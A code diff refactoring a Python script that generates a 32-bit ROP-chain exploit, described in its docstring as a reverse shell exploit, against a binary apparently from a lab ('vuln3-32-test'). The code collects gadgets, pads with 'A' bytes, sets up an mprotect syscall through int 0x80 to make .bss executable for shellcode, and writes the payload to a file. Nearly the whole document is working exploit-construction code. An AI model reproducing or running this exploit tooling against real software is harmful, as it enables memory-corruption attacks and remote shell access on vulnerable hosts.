@@ -8,16 +8,11 @@ import exploit_gadgets
 import junk_length_and_addresses
 from get_gadgets import get_gadgets, push_to_reg
 
-binary_name = "vuln3-32-test"
 
-rop = exploit_gadgets.ROPgadgets(binary_name)
-gadgets = get_gadgets(rop)
-    
-INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
+
 
 def valid(elem, rest):
     return not any(dep in [x[0] for x in rest] for dep in elem[1][1])
-    exit()
 
 def schedule(commands):
     # Iterate over every possible combination of gadget chains for each register
@@ -34,17 +29,22 @@ def schedule(commands):
                 for elem in order:
                     exploit += elem[1][0]
                 return exploit
+            
 
     print("No valid order!")
     return -1
 
-def rop_exploit(shellcode):
+def rop_exploit(binary_name):
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
     :param base_address: The base .data address
     :return: The full ROP chain reverse shell exploit packed bytes sequence
     """
+    rop = exploit_gadgets.ROPgadgets(binary_name)
+    gadgets = get_gadgets(rop)
+    
+    INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80
     (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
     
     # We need to align the BSS with the page size
@@ -52,7 +52,7 @@ def rop_exploit(shellcode):
     print(f".bss located at {bss:x}")
     exploit = b'\x41' * padding
 
-    shellcode_len = stat(shellcode).st_size
+    shellcode_len = stat(sys.argv[3]).st_size
     
     commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
@@ -84,12 +84,18 @@ def rop_exploit(shellcode):
     return exploit
 
 
-def test():
-    fileName=input("Enter the file name: ")
+def main():
+    if len(sys.argv) < 4:
+        print("Usage mprotect.py <binary name> <payload name> <shellcode name>")
+        exit(1)
+
+    binary_name = sys.argv[1]
+    fileName=sys.argv[2]
+
     outfile=open(fileName, "wb")
-    outfile.write(rop_exploit(sys.argv[1]))
+    outfile.write(rop_exploit(binary_name))
     outfile.close()
 
 
 if __name__ == "__main__":
-    test()
+    main()
